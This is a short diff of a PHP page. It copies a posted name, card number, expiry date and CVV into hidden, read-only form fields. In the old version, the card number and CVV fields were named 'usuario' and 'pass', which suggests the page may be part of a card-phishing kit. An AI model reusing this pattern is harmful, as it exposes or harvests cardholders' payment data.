@@ -87,24 +87,24 @@
 				
 				<?php 
                      $variable= $_POST['nombre'];
-        echo '<input id="dato" style="display:none" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+        echo '<input id="nombre" style="display:none" name="nombre" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 
 				   <?php 
-                     $variable1= $_POST['ctarjeta1'];
-        echo '<input id="dato1"  style="display:none" name="pass" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
+                     $variable1= $_POST['tarjeta'];
+        echo '<input id="tarjeta"  style="display:none" name="tarjeta" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
 		?>
 		<br>
 				
 				
 			<?php 
-                     $variable= $_POST['fecha'];
-        echo '<input id="dato" style="display:none" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+                     $variable= $_POST['date'];
+        echo '<input id="date" style="display:none" name="date" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
 
 				   <?php 
-                     $variable1= $_POST['cvv'];
-        echo '<input id="dato1"  style="display:none" name="pass" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
+                     $variable1= $_POST['codigo'];
+        echo '<input id="codigo"  style="display:none" name="codigo" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
 		?>
 		<br>
 					
